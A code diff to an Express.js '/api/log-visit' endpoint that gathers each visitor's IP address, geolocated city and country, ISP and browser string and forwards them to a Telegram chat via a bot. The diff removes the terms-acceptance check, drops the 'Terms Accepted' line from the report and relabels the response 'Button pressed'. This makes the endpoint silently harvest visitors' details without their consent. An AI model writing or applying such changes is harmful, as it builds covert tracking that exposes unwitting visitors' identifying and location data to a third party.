@@ -83,11 +83,6 @@ app.post('/api/log-visit', async (req, res) => {
       }
     }
 
-    const acceptedTerms = req.body.acceptedTerms === true;
-    if (!acceptedTerms) {
-      return res.status(400).json({ success: false, message: 'Terms must be accepted' });
-    }
-
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const timestamp = new Date().toISOString();
 
@@ -96,8 +91,7 @@ app.post('/api/log-visit', async (req, res) => {
                     `🌐 *IP Address:* \`${clientIP}\`\n` +
                     `📍 *Location:* ${geoInfo.city}, ${geoInfo.regionName}, ${geoInfo.country}\n` +
                     `🏢 *ISP:* ${geoInfo.isp}\n` +
-                    `🖥️ *Browser Info:* ${userAgent}\n` +
-                    `✅ *Terms Accepted:* Yes`;
+                    `🖥️ *Browser Info:* ${userAgent}\n`
 
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
       try {
@@ -119,7 +113,7 @@ app.post('/api/log-visit', async (req, res) => {
       }
     }
 
-    res.json({ success: true, message: 'Terms acceptance recorded' });
+    res.json({ success: true, message: 'Button pressed' });
   } catch (err) {
     console.error('Internal error:', err);
     res.status(500).json({ success: false, message: 'Server error' });
